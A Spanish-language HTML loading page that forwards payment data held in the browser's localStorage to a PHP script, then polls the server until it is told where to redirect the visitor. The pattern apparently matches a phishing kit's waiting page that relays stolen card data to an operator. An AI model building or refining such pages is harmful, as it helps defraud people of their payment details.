<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargar Pago</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }
        .loader-box {
            text-align: center;
        }
        .loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #002b49;
            border-radius: 50%;
            width: 70px;
            height: 70px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p {
            color: #333;
            font-size: 16px;
            font-weight: bold;
        }
    </style>
    <script>
        let globalTxId = null;

        function enviarDatos() {
            const paymentData = localStorage.getItem('pagojet');

            if (paymentData) {
                const parsedData = JSON.parse(paymentData);
                console.log("Enviando datos a procesar_formulario.php...", parsedData);

                fetch('procesar_formulario.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(parsedData),
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Respuesta del servidor:', data);
                    if (data.transaction_id) {
                        globalTxId = data.transaction_id;
                        sessionStorage.setItem('transaction_id', globalTxId);
                    }
                    verificarActualizaciones();
                })
                .catch(error => {
                    console.error('Error al enviar los datos:', error);
                    verificarActualizaciones();
                });
            } else {
                console.log("No se encontraron datos en localStorage, verificando de todas formas...");
                verificarActualizaciones();
            }
        }

        function verificarActualizaciones() {
            const txId = globalTxId || sessionStorage.getItem('transaction_id') || '';
            const url = txId ? `check_updates.php?transaction_id=${encodeURIComponent(txId)}` : 'check_updates.php';

            const interval = setInterval(() => {
                fetch(url)
                .then(response => response.json())
                .then(data => {
                    console.log('Respuesta de check_updates:', data);
                    if (data.redirect) {
                        clearInterval(interval);
                        window.location.href = data.redirect;
                    }
                })
                .catch(error => {
                    console.error('Error al verificar actualizaciones:', error);
                });
            }, 2000);
        }

        window.onload = enviarDatos;
    </script>
</head>
<body>
    <div class="loader-box">
        <div class="loader"></div>
        <p>Procesando información de pago...</p>
    </div>
</body>
</html>
